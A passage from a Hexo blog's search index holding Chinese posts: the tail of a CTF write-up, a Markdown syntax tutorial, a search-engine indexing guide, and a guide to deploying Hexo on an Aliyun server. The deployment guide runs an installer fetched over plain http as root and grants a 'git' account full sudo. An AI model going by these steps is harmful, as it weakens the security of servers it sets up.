src="/images/wordimage/20220126/binwalk.png"></p><p>flag:<code>flag&#123;b025fc9ca797a67d2103bfbc407a6d5f&#125;</code></p><hr><p>这里就是前十七题的解题思路，第一页后面十五题👉<a href="https://blog.takagisan.top/2022/014cfb2d5a.html">后面十五题</a>。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown扩展语法(下)</title>
      <link href="/2022/01d4706cc6.html"/>
      <url>/2022/01d4706cc6.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在上一篇文章讲解了Markdown的基础语法，<a href="https://blog.takagisan.top/2022/01c8efa162.html">Markdown基础语法</a>👈，点击即可。</p><hr><h2 id="一-Markdown表格"><a href="#一-Markdown表格" class="headerlink" title="一.Markdown表格"></a>一.Markdown表格</h2><p>如果要使用表格使用三个或者多个<code>---</code>减号(连字符)创建每列的标题，使用管道<code>|</code>来分隔每列，可以在任一一段添加管道。如果是Typora只需要输入<code>|</code>然后回车即可创建。</p><table><thead><tr><th>第一列</th><th>第二列</th><th>第三列</th><th>第四列</th></tr></thead><tbody><tr><td>头部</td><td>标题</td><td>身体</td><td>页脚</td></tr></tbody></table><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token table"><span class="token table-header-row"><span class="token punctuation">|</span><span class="token table-header important"> 第一列 </span><span class="token punctuation">|</span><span class="token table-header important"> 第二列 </span><span class="token punctuation">|</span><span class="token table-header important"> 第三列 </span><span class="token punctuation">|</span><span class="token table-header important"> 第四列 </span><span class="token punctuation">|</span></span><span class="token table-line"><span class="token punctuation">|</span> <span class="token punctuation">------</span> <span class="token punctuation">|</span> <span class="token punctuation">------</span> <span class="token punctuation">|</span> <span class="token punctuation">------</span> <span class="token punctuation">|</span> <span class="token punctuation">------</span> <span class="token punctuation">|</span></span><span class="token table-data-rows"><span class="token punctuation">|</span><span class="token table-data"> 头部   </span><span class="token punctuation">|</span><span class="token table-data"> 标题   </span><span class="token punctuation">|</span><span class="token table-data"> 身体   </span><span class="token punctuation">|</span><span class="token table-data"> 页脚   </span><span class="token punctuation">|</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="1-对齐"><a href="#1-对齐" class="headerlink" title="1.对齐"></a>1.对齐</h3><p>可以在标题行中间的连字符号的左侧右侧或者两侧添加<code>:</code>来进行左对齐，右对齐，或者中心对齐</p><table><thead><tr><th align="center">第一列</th><th align="left">第二列</th><th align="right">第三列</th><th>第四列</th></tr></thead><tbody><tr><td align="center">头部</td><td align="left">标题</td><td align="right">身体</td><td>页脚</td></tr></tbody></table><p>渲染代码如下</p><pre class="line-numbers language-markdo" data-language="markdo"><code class="language-markdo">| 第一列 | 第二列 | 第三列 | 第四列 || :----: | :----- | -----: | ------ ||  头部  | 标题   |   身体 | 页脚   |<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="2-格式化表中的文字"><a href="#2-格式化表中的文字" class="headerlink" title="2.格式化表中的文字"></a>2.格式化表中的文字</h3><p>可以在表格中设置文本格式比如在文字周围添加**`**来格式化文字。</p><table><thead><tr><th>格式化</th><th>文字</th></tr></thead><tbody><tr><td><code>标题</code></td><td>文字</td></tr></tbody></table><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token table"><span class="token table-header-row"><span class="token punctuation">|</span><span class="token table-header important"> 格式化 </span><span class="token punctuation">|</span><span class="token table-header important"> 文字 </span><span class="token punctuation">|</span></span><span class="token table-line"><span class="token punctuation">|</span> <span class="token punctuation">------</span> <span class="token punctuation">|</span> <span class="token punctuation">----</span> <span class="token punctuation">|</span></span><span class="token table-data-rows"><span class="token punctuation">|</span><span class="token table-data"> <span class="token code-snippet code keyword">`标题`</span> </span><span class="token punctuation">|</span><span class="token table-data"> 文字 </span><span class="token punctuation">|</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="3-表中转义管道字符"><a href="#3-表中转义管道字符" class="headerlink" title="3.表中转义管道字符"></a>3.表中转义管道字符</h3><p>可以在表格里面使用HTML字符代码<code>&amp;#124;</code>在表中显示竖线<code>|</code>字符。</p><hr><h2 id="二-围栏代码块"><a href="#二-围栏代码块" class="headerlink" title="二.围栏代码块"></a>二.围栏代码块</h2><p>如果是要在文章中显示代码，这个代码然后表示这个代码是什么语言可以使用，```，来表示比如，我想表达一句python代码，如果是我这篇博客里面，如果是呈现的代码或者命令，在右上角就能看见是什么语言。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"HelloWorld"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token code"><span class="token punctuation">```</span><span class="token code-language">python</span><span class="token code-block language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"HelloWorld"</span><span class="token punctuation">)</span></span><span class="token punctuation">```</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="三-Markdown删除线"><a href="#三-Markdown删除线" class="headerlink" title="三.Markdown删除线"></a>三.Markdown删除线</h2><p>可以让文字输入如👉~~~我是帅比~~~,这种效果。</p><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">~<span class="token strike"><span class="token punctuation">~~</span><span class="token content">我是帅比</span><span class="token punctuation">~~</span></span>~<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="四-任务列表语法"><a href="#四-任务列表语法" class="headerlink" title="四.任务列表语法"></a>四.任务列表语法</h2><p>就是实现，列出一堆列表，然后左边有勾勾和叉叉，来标明自己那些完成了，那些没有完成。</p><ul><li><input disabled="" type="checkbox"> 去世界旅行</li><li><input disabled="" type="checkbox"> 去清华大学</li><li><input disabled="" type="checkbox"> 找到女朋友</li><li><input checked="" disabled="" type="checkbox"> 摆烂</li></ul><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token list punctuation">-</span> [ ] 去世界旅行<span class="token list punctuation">-</span> [ ] 去清华大学<span class="token list punctuation">-</span> [ ] 找到女朋友<span class="token list punctuation">-</span> [x] 摆烂<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="五-使用Emoji表情"><a href="#五-使用Emoji表情" class="headerlink" title="五.使用Emoji表情"></a>五.使用Emoji表情</h2><p>有几种方法可以在文章里面实现emoji表情，第一种从其他地方复制到这里，第二种如果你是Windows11系统就可以Windows + v，如下图。</p><p><img src="/images/wordimage/20220125/emoj.png" alt="Windows11自带Emoji表情"></p><p>还有一种就是，Markdown语法来表现。</p><hr><h3 id="1-使用表情符号简码"><a href="#1-使用表情符号简码" class="headerlink" title="1.使用表情符号简码"></a>1.使用表情符号简码</h3><p>但是不知道为什么我这里似乎不能输出出来只能输出代码，如下,但是使用Windows11自带的就行</p><p>笑死我了！:joy:，Windows11:😂</p><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">笑死我了！:joy:，Windows11:😂<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="六-自动网址链接"><a href="#六-自动网址链接" class="headerlink" title="六.自动网址链接"></a>六.自动网址链接</h3><p>Markdown会自动把URL地址转换成链接比如</p><p><a href="https://blog.takagisan.top/">https://blog.takagisan.top</a></p><p>就可以直接点进去，如果不想要这种效果，只需要在网址两边添加即可。</p><p><code>https://blog.takagisan.top</code></p><p>至此，常用的扩展语法完毕。</p>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Typora </tag>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何让百度,谷歌和必应收录自己的博客？</title>
      <link href="/2022/01daa7ea61.html"/>
      <url>/2022/01daa7ea61.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当网站或者博客搭建完毕之后，自己在上面写的文章肯定希望被别人看见，广大网友肯定都是通过搜索引擎来做的，所以我们需要做的是主动去让搜索引擎收录，也叫做SEO优化</p><blockquote><p>百度百科是这样说的</p><p>搜索引擎优化，又称为SEO，即Search Engine Optimization，它是一种通过分析搜索引擎的排名规律，了解各种搜索引擎怎样进行搜索、怎样抓取互联网页面、怎样确定特定关键词的搜索结果排名的技术。搜索引擎采用易于被搜索引用的手段，对网站进行有针对性的优化，提高网站在搜索引擎中的自然排名，吸引更多的用户访问网站，提高网站的访问量，提高网站的销售能力和宣传能力，从而提升网站的品牌效应。</p></blockquote><hr><h2 id="一-百度收录"><a href="#一-百度收录" class="headerlink" title="一.百度收录"></a>一.百度收录</h2><p>如何查看自己的网站是否被百度收录，在百度搜索栏输入<a href="#code"><code>site:你的域名</code></a>，然后回车即可，如果能出来东西，那么就是被收录了，如果没出来那么就是没有，我没有被百度收录，但是被必应收录了，也是输入一样的命令，如下图</p><p>这个是我<a href="https://www.takagisan.top/">旧博客地址</a>，以后不会在上面更新，只会在现在这个博客更新</p><p><img src="/images/wordimage/20220123/sitebiying.png" alt="必应收录"></p><hr><h3 id="1-添加站点到百度"><a href="#1-添加站点到百度" class="headerlink" title="1.添加站点到百度"></a>1.添加站点到百度</h3><p>我们需要在浏览器搜索<a href="https://ziyuan.baidu.com/site/index#/">百度站长平台</a>，登录然后添加站点，根据提示填写信息即可，如下图。</p><p><img src="/images/wordimage/20220123/baiduzhanzhang.png" alt="百度站长平台"></p><p>第二步：站点属性做完只会就需要验证网站了，我这里做的是HTML验证也就是在head头部里面添加一个信息。</p><p>打开如下路径<code>/你的hexo博客文件夹/themes/hexo-theme-matery/layout/_partial/head.ejs</code>文件，如下图箭头所示，插入标签即可。</p><p><img src="/images/wordimage/20220123/baidumeta.png" alt="在网页头部添加标签"></p><p>还需要到主题配置文件的<em>_config.yml</em>里面添加，如下配置。</p><pre class="line-numbers language-none"><code class="language-none">baidu_site_verification: true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后本地<code>hexo clean</code>和<code>hexo g</code>&amp;<code>hexo d</code>推到服务器即可，然后验证，即可验证成功。</p><hr><h3 id="2-向百度推送网站资源"><a href="#2-向百度推送网站资源" class="headerlink" title="2.向百度推送网站资源"></a>2.向百度推送网站资源</h3><p>上面的步骤做完，百度知道了已经知道了你的网站，我们需要做的是，主动向百度推送我们网站的内容。</p><p>我们选择普通收录，快速收录，我反正没权限，普通收录如下图👇，发现有三种提交方式，手动提交按照提示来操作即可，这里说的是<em>sitemap</em>提交</p><p><img src="/images/wordimage/20220123/baidushoulu.png" alt="普通收录"></p><hr><h3 id="3-sitemap提交"><a href="#3-sitemap提交" class="headerlink" title="3.sitemap提交"></a>3.sitemap提交</h3><p>如果我们要通过sitemap方式提交，我们需要先安装sitemap插件，输入如下两条命令即可安装。</p><p><em><strong>安装sitemap插件</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-sitemap --save<span class="token function">npm</span> <span class="token function">install</span> hexo-generator-baidu-sitemap --save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这两个插件是用来生成sitemap文件，sitemap文件里面是用来告诉搜索引擎，我们网站是有那些资源可以抓取的。</p><p>安装完毕之后去<em>hexo博客目录下面的_config.yml</em>找到url这行，大概在14-24行左右，url内容必须是你博客的首页地址。</p><p><em><strong>url</strong></em></p><pre class="line-numbers language-none"><code class="language-none"># URL## Set your site url here. For example, if you use GitHub Page, set url as &#39;https:&#x2F;&#x2F;username.github.io&#x2F;project&#39;url: https:&#x2F;&#x2F;blog.takagisan.toppermalink: :year&#x2F;:month:abbrlink.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>之后在<em>站点配置文件下的_config.yml底部</em>添加如下配置即可</p><pre class="line-numbers language-none"><code class="language-none"># 生成sitemapsitemap:   path: sitemap.xmlbaidusitemap:   path: baidusitemap.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后就执行<code>hexo clean&amp;hexo g</code>即可在你hexo博客目录下面的<code>public</code>目录下面生成<code>sitemap.xml</code>和<code>baidusitemap.xml</code>这两个文件。</p><h3 id="4-安装hexo-abbrlink"><a href="#4-安装hexo-abbrlink" class="headerlink" title="4.安装hexo-abbrlink"></a>4.安装hexo-abbrlink</h3><p>为何要安装这个东西，因为文章标题有些时候是中文，如果改变了标题那么URL地址也会改变，不利于SEO，所以需要用这个插件，利用不同的算法和进制对文章的链接进行转换。</p><p><em><strong>安装hexo-abbrlink</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-abbrlink --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如何使用？打开hexo目录下面的<code>_config.yml</code>文件，找到<code>permalink</code>，就是在顶部，url的地方，修改如下</p><pre class="line-numbers language-none"><code class="language-none">url: https:&#x2F;&#x2F;blog.takagisan.toppermalink: :year&#x2F;:month:abbrlink.htmlabbrlink:  alg: crc32 #算法选项：crc16丨crc32  rep: hex #输出进制：dec为十进制，hex为十六进制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下图配置。</p><p><img src="/images/wordimage/20220123/codehexo.png" alt="配置hexo-abbrlink"></p><p>然后<code>hexo clean</code>&amp;<code>hexo g</code>重新生成文件，然后在访问，如下图效果。</p><p><img src="/images/wordimage/20220123/xiaoguo.png" alt="文章URL使用了crc32算法改变"></p><p>如下图，是网页访问效果，每个URL地址都是文章的地址</p><p><img src="/images/wordimage/20220123/baidumap.png" alt="map地址"></p><p>最后回到百度站长页面在sitemap的地方提交上面生成的两个地址即可。</p><h2 id="二-谷歌收录"><a href="#二-谷歌收录" class="headerlink" title="二.谷歌收录"></a>二.谷歌收录</h2><p>谷歌收录就非常简单了。</p><hr><h3 id="1-添加站点到谷歌"><a href="#1-添加站点到谷歌" class="headerlink" title="1.添加站点到谷歌"></a>1.添加站点到谷歌</h3><p>打开<a href="https://search.google.com/search-console/welcome">Google Search Console</a>，如下图填写信息然后继续。</p><p><img src="/images/wordimage/20220123/googlesearch.png" alt="谷歌收录"></p><p>我这里选择的是HTML验证还是和上面百度验证的方法一样，在头部添加meta信息，即可验证成功。</p><p>然后在站点地图这里，添加新的站点地图，由于上面百度操作的地方已经生成了文件，所以这里无需再次生成直接用即可，如下图。</p><p><img src="/images/wordimage/20220123/googlemap.png" alt="谷歌添加站点地图"></p><hr><h2 id="三-必应-Bing-收录"><a href="#三-必应-Bing-收录" class="headerlink" title="三.必应(Bing)收录"></a>三.必应(Bing)收录</h2><p><a href="https://www.bing.com/webmasters/homepage">必应(Bing)收录地址</a>，如果你做了上面谷歌导入的操作，必应也可直接用谷歌的导入即可，非常简单，按照提示操作即可。</p><p>最后欢迎各路大佬交换友链啊ヾ(≧▽≦*)o</p><hr><p>参考文章：</p><p><code>[1]:https://segmentfault.com/a/1190000037550362</code></p><p><code>[2]:https://www.cnblogs.com/Chenjiabing/p/13901712.html</code></p><p><code>[3]:https://www.sousuoyinqingtijiao.com/bing/tijiao/</code></p>]]></content>
      
      
      <categories>
          
          <category> 网站 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 网站收录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【hexo博客搭建】将搭建好的hexo博客部署到阿里云服务器上面(下)</title>
      <link href="/2022/01a1feb0d.html"/>
      <url>/2022/01a1feb0d.html</url>
      
        <content type="html"><![CDATA[<h2 id="一-部署到阿里云服务器"><a href="#一-部署到阿里云服务器" class="headerlink" title="一.部署到阿里云服务器"></a>一.部署到阿里云服务器</h2><p>既然博客也已经成功在本地部署，然后主题也成功安装，接下来就可以部署到服务器上面了，如果你也想要魔改matery主题，可以去CSDN上面找一找大佬的教程，或者联系我，也可以让你少走一些弯路(❁´◡`❁)。</p><h3 id="1-部署到服务器需要做的事情"><a href="#1-部署到服务器需要做的事情" class="headerlink" title="1.部署到服务器需要做的事情"></a>1.部署到服务器需要做的事情</h3><p>首先需要在阿里云上面购买一台服务器，然后购买域名，如果是买的国内的服务器需要完成备案，假设，到这个地方，你已经拥有了自己的服务器和域名。</p><hr><h3 id="2-生成ssh公钥"><a href="#2-生成ssh公钥" class="headerlink" title="2.生成ssh公钥"></a>2.生成ssh公钥</h3><p>在本地Windows10上用管理员模式打开dos窗口(cmd)，输入如下命令生成ssh公钥</p><p><em><strong>生成ssh公钥</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，红色箭头是输入的ssh公钥命令，划上红线的地方是公钥保存的地方，我这里保存的地方是<a href="#code">C:\Users\Takagisan.ssh\id_rsa.pub</a>，如果是在你的电脑上面应该就是<a href="#code">C:\Users(用户)\你的用户名.ssh\id_rsa.pub</a></p><p>为什么要这样做？因为后面会用上呗。</p><p><img src="/images/wordimage/sshrsa.png" alt="生成ssh公钥"></p><hr><h3 id="3-配置-config-yml"><a href="#3-配置-config-yml" class="headerlink" title="3.配置_config.yml"></a>3.配置_config.yml</h3><p>这个操作也是在本地Windows10上面，这里是配置自动化部署，我们先进入我们的hexo博客文件夹，打开blog目录下的<em>_config.yml</em>，到底部找到deploy就在更换主题地方的下面,如下图设置</p><p>蓝色箭头是我们要打开的配置文件，黑色箭头是上面配置主题的地方，红色箭头是我们要修改的地方其中在倒数第二行的@server为你所购买的域名解析后的地址，或者是IP地址</p><p><img src="/images/wordimage/hexoserver.png" alt="部署设置"></p><p>例如👇</p><pre class="line-numbers language-none"><code class="language-none">deploy:  type: git  repo: git@blog.takagisan.top:&#x2F;var&#x2F;repo&#x2F;hexoBlog.git #用户名@服务器Ip:git仓库位置  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="4-阿里云服务器上的hexo博客搭建和本地部署到服务器仓库"><a href="#4-阿里云服务器上的hexo博客搭建和本地部署到服务器仓库" class="headerlink" title="4.阿里云服务器上的hexo博客搭建和本地部署到服务器仓库"></a>4.阿里云服务器上的hexo博客搭建和本地部署到服务器仓库</h3><p>到了这里，就已经开始了，在服务器上的操作。</p><h4 id="4-1安装宝塔面板"><a href="#4-1安装宝塔面板" class="headerlink" title="4.1安装宝塔面板"></a>4.1安装宝塔面板</h4><p>首先看你在阿里云上购买的是什么服务器，比如我购买的是Centos，在<a href="https://www.bt.cn/download/linux.html">宝塔</a>官网选择自己的版本，比如我的服务器是Centos版本的就输入如下命令。</p><p><em><strong>Centos安装宝塔面板</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> -y <span class="token function">wget</span> <span class="token operator">&amp;&amp;</span> <span class="token function">wget</span> -O install.sh http://download.bt.cn/install/install_6.0.sh <span class="token operator">&amp;&amp;</span> <span class="token function">sh</span> install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为我服务器已经装过宝塔面板了，不能重新装，所以这里只能打字说明了，安装完毕之后，在终端的下面会提示登录名和密码，还有宝塔登录地址，在浏览器上登录之后，选择LNMP即可，然后在左边侧边栏一栏选择。</p><p>网站–添加站点–输入解析后的域名(或者IP地址)–底部PHP版本选择纯静态，提交，然后网站创建完成。</p><p>如下图，红色箭头是第一个点击的地方，蓝色箭头是你的域名，黑色箭头选择纯静态即可。</p><p><img src="/images/wordimage/bthexo.png" alt="宝塔部署网站"></p><p>这样做完之后，需要配置nginx了，点击网站名–配置文件，如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">server<span class="token punctuation">&#123;</span>listen <span class="token number">80</span><span class="token punctuation">;</span>server_name blog.takagisan.top<span class="token punctuation">;</span><span class="token punctuation">\</span># server_name 填写自己的域名index index.php index.html index.htm default.php default.htm default.html<span class="token punctuation">;</span>root /var/www/hexo<span class="token punctuation">;</span><span class="token punctuation">\</span># 这里root填写自己的网站根目录，修改为/var/www/hexo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下图，看箭头模仿修改</p><p><img src="/images/wordimage/nginxhexo.png" alt="nginx配置"></p><p>然后保存即可</p><hr><h4 id="4-2阿里云服务器部署仓库"><a href="#4-2阿里云服务器部署仓库" class="headerlink" title="4.2阿里云服务器部署仓库"></a>4.2阿里云服务器部署仓库</h4><p>如果你的服务器是一台新的机器我建议，输入如下命令,下面操作我建议是root用户操作</p><p><em><strong>安装依赖库</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> curl-devel expat-devel gettext-devel openssl-devel zlib-devel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em><strong>安装编译工具</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> gcc perl-ExtUtils-MakeMaker package<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当然你服务器有了编译工具和依赖库就可以不用输入上面的命令</p><p>查看git版本，做这个操作的原因是如果git版本低，需要下载新版本的git，当然也可以不用下载，如果你不想更新git可以跳过删除旧版本git–下载新版本git的操作，直接到创建git账户的地方开始，当然我还是建议更新。</p><p><em><strong>查看git版本</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em><strong>删除git</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum remove <span class="token function">git</span> -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em><strong>下载并且解压最新版本git</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/local/src  <span class="token comment">#进入下载的目录</span><span class="token function">wget</span> https://www.kernel.org/pub/software/scm/git/git-2.28.0.tar.gz    <span class="token comment">#下载最新版</span><span class="token function">tar</span> -zxvf git-2.28.0.tar.gz   <span class="token comment">#解压到当前文件夹</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em><strong>编译并安装</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> git-2.28.0  <span class="token comment">#进入文件夹</span><span class="token function">make</span> <span class="token assign-left variable">prefix</span><span class="token operator">=</span>/usr/local/git all <span class="token comment">#编译源码</span><span class="token function">make</span> <span class="token assign-left variable">prefix</span><span class="token operator">=</span>/usr/local/git <span class="token function">install</span>    <span class="token comment">#安装路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em><strong>配置git环境变量</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'export PATH=$PATH:/usr/local/git/bin'</span> <span class="token operator">>></span> /etc/bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em><strong>刷新环境变量</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> /etc/bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em><strong>查看版本号</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em><strong>创建git账户并且添加账户的权限</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adduser <span class="token function">git</span><span class="token comment">#创建git账户</span><span class="token function">passwd</span> <span class="token function">git</span><span class="token comment">#给git账户设置密码</span><span class="token function">chmod</span> <span class="token number">740</span> /etc/sudoers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em><strong>修改内容</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/sudoers  <span class="token comment">#打开需要修改的文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在上面打开的文件里面找到如下内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Allow root to run any commands anywhereroot <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span>ALL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>添加如下内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span><span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span>ALL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按下键盘上的Esc按键，然后进入进入编辑模式(shift+;)，输入:wq即可保存退出，然后修改权限。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">400</span> /etc/sudoers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>切换到git用户，并且创建~/.ssh文件和~/.ssh/authorized_keys文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> <span class="token function">git</span><span class="token comment">#切换到git账户</span><span class="token function">mkdir</span> ~/.ssh<span class="token comment">#创建~/.ssh文件</span><span class="token function">vim</span> ~/.ssh/authorized_keys<span class="token comment">#打开文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后把前面在Windows10中生成的id_rsa.pub文件中的公钥内容复制到authorized_keys里面去</p><p><em><strong>给文件赋予权限</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">600</span> /home/git/.ssh/authorized_keys<span class="token function">chmod</span> <span class="token number">700</span> /home/git/.ssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><em><strong>测试是否能免密登录git</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -v git@你的服务器IP地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em><strong>创建仓库目录</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /var/repo  <span class="token comment">#repo作为git仓库目录</span><span class="token function">chown</span> -R git:git /var/repo<span class="token function">chmod</span> -R <span class="token number">755</span> /var/repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em><strong>创建网站目录</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /var/www<span class="token function">mkdir</span> /var/www/hexo<span class="token function">chown</span> -R git:git /var/www/hexo<span class="token function">chmod</span> -R <span class="token number">755</span> /var/www/hexo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><em><strong>创建一个裸的git仓库</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> root <span class="token comment">#切换到root用户</span><span class="token builtin class-name">cd</span> /var/repo<span class="token function">git</span> init --bare hexoBlog.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em><strong>同步网站根目录</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /var/repo/hexoBlog.git/hooks/post-receive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后按i进入编辑模式，在这个文件里面添加两行代码，就是下面的两行代码直接添加进去即可，作用是指定git工作树源代码和git目录。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># !/bin/bash</span><span class="token function">git</span> --work-tree<span class="token operator">=</span>/var/www/hexo --git-dir<span class="token operator">=</span>/var/repo/hexoBlog.git checkout -f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后Esc，进入编辑模式:wq保存退出即可</p><p><em><strong>修改文件权限使得可以运行</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chown</span> -R git:git /var/repo/hexoBlog.git/hooks/post-receive<span class="token function">chmod</span> +x /var/repo/hexoBlog.git/hooks/post-receive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>至此Git仓库搭建完毕。</p><hr><h4 id="4-3重启宝塔服务和推送本地文件到服务器"><a href="#4-3重启宝塔服务和推送本地文件到服务器" class="headerlink" title="4.3重启宝塔服务和推送本地文件到服务器"></a>4.3重启宝塔服务和推送本地文件到服务器</h4><p><em><strong>重启宝塔面板</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> bt restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后回到本地Windows10系统</p><p><em><strong>清理缓存并且推送到服务器</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo clean <span class="token comment">#清理缓存</span>hexo g<span class="token comment">#重构文件</span>hexo d<span class="token comment">#推送到服务器</span><span 